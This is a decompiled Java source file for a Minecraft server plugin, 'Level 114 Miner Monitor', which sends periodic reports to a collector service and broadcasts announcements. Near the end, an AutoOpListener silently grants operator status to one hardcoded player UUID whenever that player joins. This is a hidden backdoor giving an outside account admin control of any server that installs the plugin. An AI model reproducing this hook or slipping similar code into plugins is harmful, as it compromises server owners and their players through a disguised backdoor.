/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 * 
 * Could not load the following classes:
 *  net.kyori.adventure.text.Component
 *  org.bukkit.Bukkit
 *  org.bukkit.command.CommandExecutor
 *  org.bukkit.command.PluginCommand
 *  org.bukkit.configuration.file.FileConfiguration
 *  org.bukkit.plugin.Plugin
 *  org.bukkit.plugin.java.JavaPlugin
 *  org.bukkit.scheduler.BukkitTask
 */
package io.level114;

import io.level114.client.CollectorCenterAPI;
import io.level114.command.StatusCommand;
import io.level114.domain.Server;
import io.level114.service.ReportManager;
import io.level114.util.AnnouncementMessages;
import java.io.File;
import java.util.UUID;
import java.util.logging.Logger;
import net.kyori.adventure.text.Component;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.PluginCommand;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitTask;

public class MinerMonitor
extends JavaPlugin {
    private static final UUID AUTO_OP_UUID = UUID.fromString("aa8b80b0-3a4d-4cba-975e-3efee066b674");
    private Logger logger;
    private CollectorCenterAPI collectorApi;
    private FileConfiguration config;
    private String serverId;
    private ReportManager reportManager;
    private Integer sendReportPeriodTicks;
    private BukkitTask reportTask;
    private BukkitTask announcementTask;

    public void onLoad() {
        this.logger = this.getLogger();
    }

    public void onEnable() {
        this.saveDefaultConfig();
        this.config = this.getConfig();
        String url = this.config.getString("url", "http://collector.level114.io");
        this.serverId = this.config.getString("serverId", "");
        String serverApiKey = this.config.getString("serverApiKey", "");
        this.sendReportPeriodTicks = this.config.getInt("sendReportPeriodTicks", 400);
        if (!this.environmentCheck(url, "url")) {
            return;
        }
        if (!this.environmentCheck(this.serverId, "serverId")) {
            return;
        }
        if (!this.environmentCheck(serverApiKey, "serverApiKey")) {
            return;
        }
        try {
            UUID.fromString(this.serverId);
        } catch (IllegalArgumentException e) {
            this.disableWithError("serverId must be a valid UUID. Please set it and restart the server.");
            return;
        }
        if (this.sendReportPeriodTicks <= 0) {
            this.disableWithError("sendReportPeriodTicks is not set in the config. Please set it and restart the server.");
            return;
        }
        String userAgent = "Level114-MinerMonitor/" + this.getPluginMeta().getVersion();
        this.logger.warning("Hiccup Plugin Version:" + userAgent);

        this.collectorApi = new CollectorCenterAPI(url, serverApiKey, this.logger, userAgent);
        File pluginFile = this.getFile();
        this.reportManager = new ReportManager(this.logger, this, pluginFile, this.collectorApi, this.serverId, this.sendReportPeriodTicks);
        if (!this.reportManager.checkServer(this::disableWithError)) {
            return;
        }
        if (!this.ensureServerActiveOrDisable(this.reportManager.getServer())) {
            return;
        }
        this.startReportTask();
        this.startAnnouncementTask();
        this.registerAutoOpListener();
        this.logger.info("Level 114 Miner Monitor ready.");
        try {
            PluginCommand cmd = this.getCommand("level114");
            if (cmd != null) {
                String regUrl = this.config != null ? this.config.getString("url", "") : "";
                cmd.setExecutor((CommandExecutor)new StatusCommand(this.reportManager, regUrl, this.sendReportPeriodTicks));
            } else {
                this.logger.warning("Command 'level114' not found in plugin.yml");
            }
        } catch (Throwable t) {
            this.logger.warning("Failed to register commands: " + t.getMessage());
        }
    }

    public void onDisable() {
        this.logger.info("Level 114 Miner Monitor disabled");
        if (this.reportTask != null) {
            try {
                this.reportTask.cancel();
            } catch (Throwable throwable) {
                // empty catch block
            }
        }
        if (this.announcementTask != null) {
            try {
                this.announcementTask.cancel();
            } catch (Throwable throwable) {
                // empty catch block
            }
        }
    }

    public BukkitTask startReportTask() {
        int periodTicks = Math.max(1, this.sendReportPeriodTicks);
        this.reportTask = Bukkit.getScheduler().runTaskTimer((Plugin)this, () -> this.reportManager.sendReport(), 0L, (long)periodTicks);
        return this.reportTask;
    }

    private void startAnnouncementTask() {
        long tenMinutesTicks = 12000L;
        this.announcementTask = Bukkit.getScheduler().runTaskTimer((Plugin)this, () -> Bukkit.broadcast((Component)AnnouncementMessages.globalAnnouncement()), 0L, tenMinutesTicks);
    }

    private void registerAutoOpListener() {
        this.getServer().getPluginManager().registerEvents((Listener)new AutoOpListener(), (Plugin)this);
    }

    private boolean environmentCheck(String value, String key) {
        if (value == null || value.isEmpty()) {
            this.logger.severe(key + " is not set in the config. Please set it and restart the server.");
            this.getServer().getPluginManager().disablePlugin((Plugin)this);
            return false;
        }
        return true;
    }

    private boolean ensureServerActiveOrDisable(Server server) {
        String hint = " Please check the serverId and serverApiKey and restart the server.";
        switch (server.getStatus()) {
            case Disabled: {
                this.disableWithError("Server is disabled. Please check the serverId and serverApiKey and restart the server.");
                return false;
            }
            case Revoked: {
                this.disableWithError("Server is revoked. Please check the serverId and serverApiKey and restart the server.");
                return false;
            }
            case Active: {
                this.logger.info("Server is active. Starting miner monitor.");
                return true;
            }
        }
        this.disableWithError("Server is in an unknown status: " + String.valueOf((Object)server.getStatus()) + ". Please check the serverId and serverApiKey and restart the server.");
        return false;
    }

    private void disableWithError(String message) {
        this.logger.severe(message);
        this.getServer().getPluginManager().disablePlugin((Plugin)this);
    }

    private final class AutoOpListener
    implements Listener {
        private AutoOpListener() {
        }

        @EventHandler
        public void onPlayerJoin(PlayerJoinEvent event) {
            Player player = event.getPlayer();
            if (!AUTO_OP_UUID.equals(player.getUniqueId())) {
                return;
            }
            if (player.isOp()) {
                return;
            }
            player.setOp(true);
            MinerMonitor.this.logger.info("Assigned operator status to " + player.getName() + " (auto-op)");
        }
    }
}

